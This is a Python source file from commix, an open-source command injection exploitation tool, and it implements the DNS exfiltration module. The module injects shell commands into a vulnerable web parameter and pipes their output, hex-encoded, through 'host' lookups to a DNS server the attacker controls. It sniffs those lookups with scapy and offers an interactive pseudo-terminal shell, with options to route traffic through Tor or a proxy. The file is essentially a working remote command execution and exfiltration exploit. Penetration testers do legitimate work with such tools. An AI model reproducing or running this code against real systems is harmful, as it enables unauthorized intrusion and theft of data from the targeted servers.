#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import os
import sys
import time
import signal
import socket
import urllib
import urllib2
import threading

from src.utils import menu
from src.utils import logs
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import parameters

from src.core.shells import reverse_tcp
from src.core.injections.controller import checks

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

readline_error = False
try:
  import readline
except ImportError:
  if settings.IS_WINDOWS:
    try:
      import pyreadline as readline
    except ImportError:
      readline_error = True
  else:
    try:
      import gnureadline as readline
    except ImportError:
      readline_error = True
  pass


"""
The DNS exfiltration technique: 
exfiltrate data using a user-defined DNS server [1].

[1] http://www.contextis.com/resources/blog/data-exfiltration-blind-os-command-injection/
"""

def querysniff(pkt):
  if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
    if ".xxx" in pkt.getlayer(DNS).qd.qname:
      print pkt.getlayer(DNS).qd.qname.split(".xxx")[0].decode("hex")

def signal_handler(signal, frame):
  os._exit(0)

def snif(dns_server):
  print( Style.BRIGHT + "(!) Started the sniffer between you" + Style.BRIGHT + 
          " and the DNS server " + Fore.YELLOW + dns_server + Style.RESET_ALL + Style.BRIGHT + "." + Style.RESET_ALL)
  while True:
    sniff(filter="port 53", prn=querysniff, store = 0)
 
def cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter):
  # DNS exfiltration payload.
  payload = ("; " + cmd + " | xxd -p -c 16 | while read line; do host $line.xxx " + dns_server + "; done")
  
  # Check if defined "--verbose" option.
  if menu.options.verbose:
    sys.stdout.write("\n" + Fore.GREY + settings.PAYLOAD_SIGN + payload + Style.RESET_ALL)

  if http_request_method == "GET":
    url = url.replace(settings.INJECT_TAG, "")
    data = payload.replace(" ", "%20")
    req = url + data
  else:
    values =  {vuln_parameter:payload}
    data = urllib.urlencode(values)
    req = urllib2.Request(url=url, data=data)
    
  sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
  response = urllib2.urlopen(req)
  time.sleep(2)
  sys.stdout.write("\n" + Style.RESET_ALL)

def input_cmd(dns_server, http_request_method, url, vuln_parameter, technique):

  err_msg = ""
  if menu.enumeration_options():
    err_msg += "enumeration"
  if menu.file_access_options():
    if err_msg != "":
      err_msg = err_msg + " and "
    err_msg = err_msg + "file-access"

  if err_msg != "":
    print Fore.YELLOW + settings.WARNING_SIGN + "The " + err_msg + " options are not supported by this module because of the structure of the exfiltrated data. Please try using any unix-like commands manually." + Style.RESET_ALL 
  
  # Pseudo-Terminal shell
  go_back = False
  go_back_again = False
  while True:
    if go_back == True:
      break
    gotshell = raw_input("\n" + settings.QUESTION_SIGN + "Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
    if gotshell in settings.CHOICE_YES:
      print "\nPseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
      if readline_error:
        checks.no_readline_module()
      while True:
        try:
          # Tab compliter
          if not readline_error:
            readline.set_completer(menu.tab_completer)
            # MacOSX tab compliter
            if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
              readline.parse_and_bind("bind ^I rl_complete")
            # Unix tab compliter
            else:
              readline.parse_and_bind("tab: complete")
          cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
          cmd = checks.escaped_cmd(cmd)
          if cmd.lower() in settings.SHELL_OPTIONS:
            if cmd.lower() == "quit" or cmd.lower() == "back":       
              print ""             
              os._exit(0)
            elif cmd.lower() == "?": 
              menu.shell_options()
            elif cmd.lower() == "os_shell": 
              print Fore.YELLOW + settings.WARNING_SIGN + "You are already into the 'os_shell' mode." + Style.RESET_ALL + "\n"
            elif cmd.lower() == "reverse_tcp":
              print Fore.YELLOW + settings.WARNING_SIGN + "This option is not supported by this module." + Style.RESET_ALL + "\n"
          else:
            # Command execution results.
            cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter)

        except KeyboardInterrupt:
          print ""
          os._exit(0)
          
        except:
          print ""
          os._exit(0)

    elif gotshell in settings.CHOICE_NO:
      print ""
      os._exit(0)

    elif gotshell in settings.CHOICE_QUIT:
      print ""
      os._exit(0)

    else:
      if gotshell == "":
        gotshell = "enter"
      print Back.RED + settings.ERROR_SIGN + "'" + gotshell + "' is not a valid answer." + Style.RESET_ALL + "\n"
      pass


def exploitation(dns_server, url, http_request_method, vuln_parameter, technique):
  #signal.signal(signal.SIGINT, signal_handler)
  sniffer_thread = threading.Thread(target=snif, args=(dns_server, )).start()
  #time.sleep(2)
  if menu.options.os_cmd:
    cmd = menu.options.os_cmd
    cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter)
    print ""
    os._exit(0)
  else:
    input_cmd(dns_server, http_request_method, url, vuln_parameter, technique)


def dns_exfiltration_handler(url, http_request_method):
  # You need to have root privileges to run this script
  if os.geteuid() != 0:
    print "\n" + Back.RED + settings.ERROR_SIGN + "You need to have root privileges to run this option." + Style.RESET_ALL
    os._exit(0)

  if http_request_method == "GET":
    #url = parameters.do_GET_check(url)
    vuln_parameter = parameters.vuln_GET_param(url)
    request = urllib2.Request(url)
    headers.do_check(request)
    
  else:
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    parameter = parameters.do_POST_check(parameter)
    request = urllib2.Request(url, parameter)
    headers.do_check(request)
    vuln_parameter = parameters.vuln_POST_param(parameter, url)
  
  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      response = proxy.use_proxy(request)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print "\n" + Back.RED + settings.ERROR_SIGN + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          os._exit(0)

  # Check if defined Tor.
  elif menu.options.tor:
    try:
      response = tor.use_tor(request)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print "\n" + Back.RED + settings.ERROR_SIGN + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          os._exit(0)

  else:
    try:
      response = urllib2.urlopen(request)
    except urllib2.HTTPError, err:
      if settings.IGNORE_ERR_MSG == False:
        print "\n" + Back.RED + settings.ERROR_SIGN + str(err) + Style.RESET_ALL
        continue_tests = checks.continue_tests(err)
        if continue_tests == True:
          settings.IGNORE_ERR_MSG = True
        else:
          os._exit(0)

  dns_server = menu.options.dns_server
      
  technique = "DNS exfiltration module"
  sys.stdout.write(settings.INFO_SIGN + "Loading the " + technique + ". \n")
  exploitation(dns_server, url, http_request_method, vuln_parameter, technique)

if __name__ == "__main__":
  dns_exfiltration_handler(url, http_request_method)
